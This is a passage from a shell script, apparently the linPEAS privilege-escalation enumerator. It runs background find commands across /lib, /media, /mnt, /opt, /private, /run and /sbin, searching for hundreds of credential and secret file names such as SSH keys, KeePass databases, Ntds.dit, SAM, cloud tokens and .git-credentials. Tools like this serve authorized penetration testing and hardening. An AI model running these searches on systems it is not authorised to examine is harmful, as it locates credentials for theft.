\"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_LIB=`eval_bckgrd "find ${ROOT_FOLDER}lib -name \"*.service\" -o -name \"log4j-core*.jar\" -o -name \"rocketchat.service\" -o -name \"*.socket\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_LIB32=`eval_bckgrd "find ${ROOT_FOLDER}lib32 -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" -o -name \"log4j-core*.jar\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_LIB64=`eval_bckgrd "find ${ROOT_FOLDER}lib64 -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" -o -name \"log4j-core*.jar\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_MEDIA=`eval_bckgrd "find ${ROOT_FOLDER}media -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_MNT=`eval_bckgrd "find ${ROOT_FOLDER}mnt -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"sess_*\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_OPT=`eval_bckgrd "find ${ROOT_FOLDER}opt -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_PRIVATE=`eval_bckgrd "find ${ROOT_FOLDER}private -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"sess_*\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_RUN=`eval_bckgrd "find ${ROOT_FOLDER}run -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SBIN=`eval_bckgrd "find ${ROOT_FOLDER}sbin -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name 